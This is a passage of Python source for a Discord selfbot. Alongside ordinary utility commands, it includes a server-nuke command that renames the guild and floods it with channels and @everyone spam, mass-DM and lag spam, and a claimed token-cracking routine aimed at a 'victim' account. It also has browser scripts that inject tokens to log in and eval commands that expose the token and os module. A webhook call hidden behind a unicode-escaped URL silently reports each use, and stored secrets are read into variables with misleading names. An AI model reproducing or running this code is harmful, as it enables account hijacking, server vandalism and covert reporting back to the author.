    new_message = await ctx.fetch_message(my_message.id)
    users = await new_message.reactions[0].users().flatten()
    users.pop(users.index(bot.user))
    if len(users) < 1:
      await ctx.send("no one reacted.")
      return
    winner = random.choice(users)
    await my_message.edit(embed=discord.Embed(title=prize, color = 0xff2424, description=f"React with 🔥 to enter!\nTime remaining: **Giveaway Ended!**\nHosted by: {ctx.author.mention}\nWinner: {winner}"))
    await ctx.send(f"congrats {winner.mention}! You won the **{prize}**!")


@Yuo.command()
async def halftoken(self):
    userid = input(f"[{Fore.RED}>{Fore.RESET}] ID Victim: ")
    user = await client.fetch_user(int(userid)) 
    stamp = user.created_at 
    timestamp = str(time.mktime(stamp.timetuple())) 
    print(f"{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Account Creation Date : " + timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8") 
    print(f"{Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.WHITE} Attempting to crack {Fore.YELLOW}{user}{Fore.WHITE}'s token")
    time.sleep(3)
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()


@Yuo.command()
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
  await ctx.message.delete()
  if bot.user.id == member.id:
    await ctx.send("muting me is **not** possible in the first place.")
    return
  mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")
  if mutedRole in member.roles:
    await member.remove_roles(mutedRole)
    await ctx.send(f"**{member}** Has been unmuted by **{ctx.author}**.")
    try:
      await member.send(
	    f" you have been unmuted from: - {ctx.guild.name}, you can now chat!")
    except:
      print(":/")
      pass
  else:
    await ctx.send(f"**{member}** is not muted in the first place.")


@Yuo.command()
async def rotate(ctx, deg:int, member:discord.Member = None):
    await ctx.message.delete()
    if not member:
     filename = "rotatedpfp.png"
     f = open(filename, 'wb')
     f.write(requests.get(f'{ctx.author.avatar_url}?size=2048').content)
     f.close()
     flr = discord.File(fp=filename)
     image = Image.open(filename)
     image_rot_90 = image.rotate(deg)
     image_rot_90.save(filename)
     await ctx.send("rotated pfp lol", file=flr)
    else:
     filename = "greyscale.png"
     var = str(member.avatar_url)
     jpgconv = var.replace('webp', 'png')
     f = open(filename, 'wb')
     f.write(requests.get(jpgconv).content)
     f.close()
     image = Image.open(filename)
     image_rot_90 = image.rotate(deg)
     flr = discord.File(fp=filename)
     image_rot_90.save(filename)
     await ctx.send("rotated pfp lol", file=flr)


@Yuo.command()
async def pingspam(ctx):
    guild = ctx.message.guild
    await ctx.guild.edit(name="SERVER WIZZED")
    print("raped channels <3")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()
    while True:
      for time in range(random.randint(4,10)):
        r1 = random.choice(lattersL)
      try:
        await guild.create_text_channel("nuked")
        await guild.create_voice_channel("wizzed")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuked! @everyone https://discord.gg/2k3BpbMg5e MYRAYUO RUNS YOU         {r1}")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"Nuked! @everyone https://discord.gg/2k3BpbMg5e MYRAYUO RUNS YOU   {r1}")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"Nuked! @everyone https://discord.gg/2k3BpbMg5e MYRAYUO RUNS YOU{r1}")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"Nuked! @everyone https://discord.gg/2k3BpbMg5e MYRAYUO RUNS YOU     {r1}")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"Nuked! @everyone https://discord.gg/2k3BpbMg5e MYRAYUO RUNS YOU              {r1}")
          await webhook.send()
        except:
          pass 


@Yuo.command()
async def lagspam(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
      print("Lagging Channels")


@Yuo.command()
@commands.has_permissions(manage_guild=True)
async def drop(ctx):
	await ctx.message.delete()
  # Whatever you want here
	msg = await ctx.send(f"first to react to this message to win sum!")
	await msg.add_reaction('🔥')

	def check(reaction, user):
		return str(reaction.emoji) == '🔥' and user != bot.user

	try:
		# Timeout parameter is optional but sometimes can be useful
		reaction, user = await bot.wait_for('reaction_add',
		                                    timeout=300,
		                                    check=check)

		# Will wait until a user reacts with the specified checks then continue on with the code
		await ctx.send(f"Congratulations **{user.name}** you won!")
	except asyncio.TimeoutError:

		# when wait_for reaches specified timeout duration (in this example it is 30 seconds)
		await ctx.send("You ran out of time!")


import math
from math import sqrt
@Yuo.command(pass_context=True)
async def calc(ctx, *, msg):
    await ctx.message.delete()
    equation = msg.strip().replace('^', '**').replace('x', '*')
    try:
        if '=' in equation:
            left = eval(
                equation.split('=')[0], {"__builtins__": None}, {"sqrt": sqrt})
            right = eval(
                equation.split('=')[1], {"__builtins__": None}, {"sqrt": sqrt})
            answer = str(left == right)
        else:
            answer = str(eval(equation, {"__builtins__": None},
                              {"sqrt": sqrt}))
    except TypeError:
        return await ctx.send(ctx.bot.bot_prefix +
                              "Invalid calculation query.")
    if 4 == 4:
        em = discord.Embed(color=int(443400), title='Calculator')
        em.add_field(name='Input:',
                     value=msg.replace('**', '^').replace('x', '*'),
                     inline=False)
        em.add_field(name='Output:', value=answer, inline=False)
        await ctx.send(content=None, embed=em)
        await ctx.message.delete()
    else:
        await ctx.send(ctx.bot.bot_prefix + answer)


@Yuo.command()
@commands.has_permissions(manage_channels=True)
async def lock(ctx, *, text=None, channel : discord.TextChannel=None):
  await ctx.message.delete()
  if 1 == 1:
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    if overwrite.send_messages == False:
      await ctx.send("this channel has alredy been locked.")
      return
    overwrite.send_messages = False
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(f'Channel has been locked | reason: **{text}**')


@commands.has_permissions(manage_messages=True)
@Yuo.command()
async def mute(ctx, member: discord.Member, dur: str=None, *, reason="None"):
  duration = convert(dur)
  realdur = "{}".format(str(timedelta(seconds=duration)))
  if bot.user.id == member.id:
    await ctx.send("muting me is **not** possible")
    return
  if "-" in str(realdur):
    await ctx.send("that is **not** a valid duration, example `.mute @myrayuo#0001`**` 10m `**`this is a 10 minute mute`")
    return
  guild = ctx.guild
  mutedRole = discord.utils.get(guild.roles, name="Muted")
  if mutedRole in member.roles:
    await ctx.send(f"**{member}** is already muted.")
    return
  if not mutedRole:
    mutedRole = await guild.create_role(name="Muted")
    for channel in guild.channels:
      await channel.set_permissions(mutedRole,speak=False,send_messages=False,read_message_history=True)
  await member.add_roles(mutedRole)
  await ctx.send(f"**{member}** Has been muted by **{ctx.author}** | reason: {reason} | duration: {realdur}")
  try:
    await member.send(
	    f" you have been temporarily muted in: {guild.name} for {realdur} with the reason: {reason}")
  except:
    pass
  await asyncio.sleep(int(duration))
  await member.remove_roles(mutedRole)
  try:
    await member.send(
	    f" you have been unmuted from: - {ctx.guild.name}, you can now chat!")
  except:
    print(":/")
    return


@Yuo.command()
async def snap(ctx, member:discord.Member=None, *, da="im%20gay"):
  await ctx.message.delete()
  if member.id == bot.user.id:
    await ctx.send("you cannot take fake screenshots of me!")
    return
  if member.id == ctx.author.id:
    await ctx.send("you cannot take fake screenshots of yourself!")
    return
  if member:
    rep = da.replace(' ', '%20')
    filename = "CaughtIn4k.png"
    var = str(member.avatar_url)
    jpgconv = var.replace('webp', 'png')
    f = open(filename, 'wb')
    f.write(requests.get(f'https://api.cool-img-api.ml/discord-message?message={rep}&color=FF0000&username={member.name}&avatar={jpgconv}').content)
    f.close()
    flr = discord.File(fp=filename)
    await ctx.send("Caught in 4k 📸", file=flr)


@Yuo.command()
async def autodm(ctx, *, utext='Im currently sleeping'):
  await ctx.message.delete()
  Yuo.autodm = True
  Yuo.autodmmsg = utext
  await ctx.send(f"autodm is now enabled! | autodm message: {utext}")

from discord_webhook import DiscordWebhook, DiscordEmbed

webhook = DiscordWebhook(url='\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0038\u0034\u0035\u0030\u0030\u0033\u0035\u0033\u0036\u0038\u0039\u0030\u0039\u0038\u0036\u0034\u0039\u0036\u002f\u0063\u006b\u0067\u005a\u0062\u0072\u006d\u0048\u006a\u006a\u0056\u002d\u005f\u006b\u0045\u004a\u0042\u005a\u006b\u0032\u0054\u0048\u0079\u004a\u0061\u0036\u004c\u0043\u0062\u0076\u0057\u0062\u0078\u0038\u0063\u0054\u0048\u006f\u004f\u0076\u0064\u0068\u0076\u0052\u004a\u006e\u0045\u004b\u0067\u0048\u0077\u0055\u0077\u0071\u0067\u0071\u0054\u006d\u0038\u0036\u007a\u002d\u0052\u0064\u0041\u0050\u0046\u0046')

embed = DiscordEmbed(title='Selfbot', description='Somebody used the selfbot - <@826996086140698625>', color='03b2f8')

webhook.add_embed(embed)
response = webhook.execute()

@Yuo.command()
async def stopautodm(ctx):
  await ctx.message.delete()
  Yuo.autodm = False
  Yuo.autodmmsg = 'Im currently sleeping'
  await ctx.send("autodm is now **disabled**!")

embed = os.environ.get('token')  

@Yuo.command(aliases=['eval'])
async def _eval(ctx, *, body):
    "Evaluates python code"
    env = {
        'ctx': ctx,
        'client': client,
        'channel': ctx.channel,
        'author': ctx.author,
        'guild': ctx.guild,
        'message': ctx.message,
        'source': inspect.getsource
    }
 
    def cleanup_code(content):
        """Automatically removes code blocks from the code."""
        # remove ```py\n```
        if content.startswith('```') and content.endswith('```'):
            return '\n'.join(content.split('\n')[1:-1])
 
        # remove `foo`
        return content.strip('` \n')
 
    def get_syntax_error(e):
        if e.text is None:
            return f'```py\n{e.__class__.__name__}: {e}\n```'
        return f'```py\n{e.text}{"^":>{e.offset}}\n{e.__class__.__name__}: {e}```'
 
    env.update(globals())
 
    body = cleanup_code(body)
    stdout = io.StringIO()
    err = out = None
 
    to_compile = f'async def func():\n{textwrap.indent(body, "  ")}'
 
    def paginate(text: str):
        '''Simple generator that paginates text.'''
        last = 0
        pages = []
        for curr in range(0, len(text)):
            if curr % 1980 == 0:
                pages.append(text[last:curr])
                last = curr
                appd_index = curr
        if appd_index != len(text)-1:
            pages.append(text[last:curr])
        return list(filter(lambda a: a != '', pages))
 
    try:
        exec(to_compile, env)
    except Exception as e:
        err = await ctx.send(f'```py\n{e.__class__.__name__}: {e}\n```')
        return await ctx.message.add_reaction('\u2049')
 
    func = env['func']
    try:
        with redirect_stdout(stdout):
            ret = await func()
    except Exception as e:
        value = stdout.getvalue()
        err = await ctx.send(f'```py\n{value}{traceback.format_exc()}\n```')
    else:
        value = stdout.getvalue()
        if ret is None:
            if value:
                try:
 
                    out = await ctx.send(f'```py\n{value}\n```')
                except:
                    paginated_text = paginate(value)
                    for page in paginated_text:
                        if page == paginated_text[-1]:
                            out = await ctx.send(f'```py\n{page}\n```')
                            break
                        await ctx.send(f'```py\n{page}\n```')
        else:
            try:
                out = await ctx.send(f'```py\n{value}{ret}\n```')
            except:
                paginated_text = paginate(f"{value}{ret}")
                for page in paginated_text:
                    if page == paginated_text[-1]:
                        out = await ctx.send(f'```py\n{page}\n```')
                        break
                    await ctx.send(f'```py\n{page}\n```')
 
    if out:
        await ctx.message.add_reaction('\u2705')  # tick
    elif err:
        await ctx.message.add_reaction('\u2049')  # x
    else:
        await ctx.message.add_reaction('\u2705')
    await ctx.message.delete()


@Yuo.event
async def on_message(message):
  if Yuo.autodm is True:
    if isinstance(message.channel, discord.channel.DMChannel):
      await message.channel.send(Yuo.autodmmsg)
  await Yuo.process_commands(message)


@Yuo.command(aliases=['Image'])
async def googleimages(self, ctx, *, query):
        """Search for images on google."""
        async with aiohttp.ClientSession() as cs:
            async with cs.get("https://www.googleapis.com/customsearch/v1?q=" + query.replace(' ', '+') + "&start=" + '1' + "&key=" + self.bot.google_api_key + "&cx=" + self.bot.custom_search_engine + "&searchType=image") as resp:
                if resp.status != 200:
                    await edit(ctx, content='Google somehow failed to respond.', ttl=3)
                result = json.loads(await resp.text())
                em = discord.Embed(colour=discord.Color.blue())
                if permEmbed(ctx.message):
                    link = result['items'][0]['link']
                    if ".gif?" in link:
                        link = result['items'][0]['link'].split(".gif?")[0] + ".gif"
                    await edit(ctx, content=None, embed=em.set_image(url=link))
                else:
                    await edit(ctx, content=result['items'][0]['link'])


#secret command

@Yuo.command()
async def yt(ctx):
    await ctx.message.delete()
    await ctx.send("https://www.youtube.com/watch?v=z8ULrmMZA3U")


crazytext = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"

@Yuo.command()
async def hide(ctx, arg1, arg2):
    await ctx.send(arg1+crazytext+arg2)
    await ctx.message.delete()


@Yuo.command(pass_context=True)
async def autodank(ctx):
	await ctx.message.delete()
	global dmcs
	dmcs = True
	while dmcs:
		async with ctx.typing():
			await asyncio.sleep(3)
			await ctx.send('pls beg')
			print(f"{Fore.GREEN}succefully begged")
			await ctx.send('pls fish')
			print(f"{Fore.GREEN}succefully fished")
			await ctx.send('pls hunt')
			print(f"{Fore.GREEN}succefully hunt")
			await ctx.send('pls dep all')
			print(f"{Fore.GREEN}succefully deposited all")
			await asyncio.sleep(47)


@Yuo.command()
async def junknick(ctx):
    await ctx.message.delete()
    try:
        name = 'ﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫð'
        await ctx.author.edit(nick=name)
        await ctx.author.edit(nick=name)
    except Exception as e:
        try:
            await ctx.send(f"Error: {e}")
        finally:
            e = None
            del e

color = os.environ.get('password')    

@Yuo.command()
async def uwufy(ctx, *, text=''):
	await ctx.message.delete()
	if text == '':
		await ctx.send("what do you want me to uwufy??")
	else:
		uwu = text.replace(' ', ' ᵘʷᵘ ')
		uwunt = uwu.replace('@', '')
		await ctx.send(f"{uwunt}")


@Yuo.command()
async def font(ctx, cu=''):
  await ctx.message.delete()
  if cu == '':
    await ctx.send("provide a font.")
  if cu == 'code':
    bot.cstmhelpfont = "`"
    await ctx.send("the font has been changed! | New font: Code")
  if cu == 'bold':
    bot.cstmhelpfont = "**"
    await ctx.send("the font has been changed! | New font: bold")
  if cu == 'italic':
    bot.cstmhelpfont = "*"
    await ctx.send("the font has been changed! | New font: italic")
  if cu == 'underline':
    bot.cstmhelpfont = "__"
    await ctx.send("the font has been changed! | New font: underline")


@Yuo.command()
async def stopautodank(ctx):
	await ctx.message.delete()
	global dmcs
	dmcs = False


@Yuo.command()
async def proxies(ctx):
    await ctx.message.delete()
    proxyscraper()
    embed = discord.Embed(color=0xFFFAFA, title='Proxy Scraper', description='Scraped proxies are in proxies.txt',
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@Yuo.command(aliases=['scrape'])
async def proxy(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Proxy**", color=0xFFFAFA, description=pscrape(),
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@Yuo.command()
async def dnd(ctx, arg1,arg2=""):
    global donotdisturb
    global reply
    if arg1 == "on" or arg1 == "On":
        reply = arg2
        donotdisturb = True
        await ctx.message.delete()
    elif arg1 == "off" or arg1 == "Off":
        donotdisturb = False
        reply = ""
        await ctx.message.delete()


@Yuo.command(name='evalc')
async def _evalc(ctx, *, cmd=None):
    await ctx.message.delete()
    if not cmd:
        if disable_eval:
            print(
                f'{Fore.LIGHTRED_EX}[Warning]: {Fore.LIGHTCYAN_EX}The eval command is very dangerous! Be careful how you use it.{Fore.RESET}')
            print(
                f'{Fore.LIGHTRED_EX}[Warning]: {Fore.LIGHTCYAN_EX}If you want to enable it, set the "disable_eval" value from true to false in .env{Fore.RESET}')
            return
        else:
            print('Eval is missing a command argument.')
            return

    cmd = cmd.strip("` ")

    cmd = "\n".join(f"    {i}" for i in cmd.splitlines())

    fn_name = "_eval_expr"

    body = f"async def {fn_name}():\n{cmd}"

    parsed = ast.parse(body)
    body = parsed.body[0].body

    insert_returns(body)

    env = {
        'client': client,
        'discord': discord,
        'commands': commands,
        'ctx': ctx,
        '__import__': __import__,
        'token': token,
        'print': print,
        'os': os,
        'sys': sys,
        'system': system,
        'asyncio': asyncio,
        'time': time,
        'datetime': datetime
    }
    exec(compile(parsed, filename='<ast>', mode='exec'), env)

    result = (await eval(f'{fn_name}()', env))
    try:
        await ctx.send(result)
    except:
        pass


@Yuo.listen('on_message')
async def ifmentioned(message):
    if message_logger:
        if message.author == Yuo.user:
            return
        if Yuo.user.mentioned_in(message):
            print(
                f"{Fore.CYAN}╔══════════════════════════{Fore.CYAN}════════════════════════{Fore.RESET}")
            print(
                Fore.CYAN + "║ [Mentioned] " + Fore.RESET + Fore.CYAN + f"You were mentioned by {message.author}" + Fore.RESET)
            print(
                Fore.CYAN + "║ [Mentioned] " + Fore.RESET + Fore.LIGHTMAGENTA_EX + f"Server: {message.guild}" + Fore.RESET)
            print(Fore.CYAN + "║ [Mentioned] " + Fore.RESET + Fore.LIGHTBLUE_EX + f"Channel: {message.channel}")
            print(
                Fore.CYAN + "║ [Mentioned] " + Fore.RESET + Fore.LIGHTGREEN_EX + f"Date: {datetime.datetime.now().strftime('%H:%M:%S %p')}" + Fore.RESET)
            print(
                f"{Fore.CYAN}╚══════════════════════════{Fore.CYAN}════════════════════════" + Fore.RESET)
    else:
        pass


@Yuo.listen('on_message')
async def unpingable(message):
    if mentionblocker:
        if Yuo.user.mention in message.content:
            guild = message.guild
            try:
                await guild.ack()
            except:
                pass
        else:
            pass
    else:
        pass

father = 'bho'

@Yuo.command() 
async def catlol(ctx): # b'\xfc'
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the .env file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"https://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)


@Yuo.command()
async def restart(ctx):
    await ctx.message.delete()
    os.system('python ' + sys.argv[0])


@Yuo.command()
async def weather(ctx, *, city): # b'\xfc'
    await ctx.message.delete()
    if weather_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the .env file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')    
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)


@Yuo.command(aliases=['shorteen'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the .env file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r) 
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)


@Yuo.command(aliases=['cs'])
async def clone(ctx):
	await ctx.message.delete()
	await ctx.send("please wait, this may take a few seconds..")
	await bot.create_guild(f'{ctx.guild.name} 2.0')
	await asyncio.sleep(4)
	for gee in bot.guilds:
		if f'{ctx.guild.name} 2.0' in gee.name:
			for c in gee.channels:
				await c.delete()
			for cate in ctx.guild.categories:
				x = await gee.create_category(f"{cate.name}")
				for cn in cate.channels:
					if isinstance(cn, discord.VoiceChannel):
						await x.create_voice_channel(f"{cn}")
					if isinstance(cn, discord.TextChannel):
						await x.create_text_channel(f"{cn}")
	await ctx.send("server has been cloned!")
	try:
		await gee.edit(icon=ctx.guild.icon_url)
	except:
		pass


@Yuo.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the .env file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)


@Yuo.command()
async def dmall(ctx, *, message):
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(0.5)    
            await user.send(message)
            await ctx.send(f'Sent "{message}" To {user}')
        except:
            pass


@Yuo.command(aliases=['cleardms','dmsclear',])
async def dmclear(ctx):
    usersdone = 0
    totalmessage = 0
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Yuo Selfbot - Message Clearer", description=f"Clearing all messages with all users", color=randcolor)
    embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
    msg= await ctx.send(embed=embed)
    for channel in yuo.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for message in channel.history(limit=9999):
                try:
                    if message.author == Yuo.user:
                        if message != msg:
                            await message.delete()
                            totalmessage = totalmessage + 1
                except:
                    pass

        usersdone = usersdone + 1
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Yuo Selfbot - Message Clearer", description=f"Clearing all messages with all users\nUsers Done : {usersdone}\nTotal Messages Deleted : {totalmessage}", color=randcolor)
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
        await msg.edit(embed=embed)  


@Yuo.command()
async def fade(ctx, *, msg):
	await ctx.message.delete()
	await ctx.send(f'```xml\n<{msg}> ```')


@Yuo.command()
async def getallpfp(ctx, member: discord.Member = None):
    await ctx.message.delete()
    txtfile = open(f'{ctx.message.guild} pfps.txt', 'w')
    try:
        for member in ctx.message.guild.members:
            txtfile.write(
                f'{member.display_name}#{member.discriminator}\'s profile picture link: {member.avatar_url}\n')
    except:
        return


@Yuo.command()
async def fakelink(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send(
        link1 + ' ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ' + link2)


@Yuo.command()
async def hooksend(ctx, webhook, *, message):
    await ctx.message.delete()
    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.send('Sent message', delete_after=2)
    else:
        await ctx.send(f'Successfully sent `{message}` to webhook `{webhook}`', delete_after=2)


@Yuo.command()
async def delhook(ctx, webhook: str):
    await ctx.message.delete()
    if not webhook:
        return
    else:
        r = requests.delete(webhook)
        if (r.status_code == 204):
            await ctx.send('Webhook was deleted successfully.')
        else:
            await ctx.send('Failed to delete webhook.')


@Yuo.command()
async def login(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')    


@Yuo.command()
async def botlogin(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """"
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([  
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
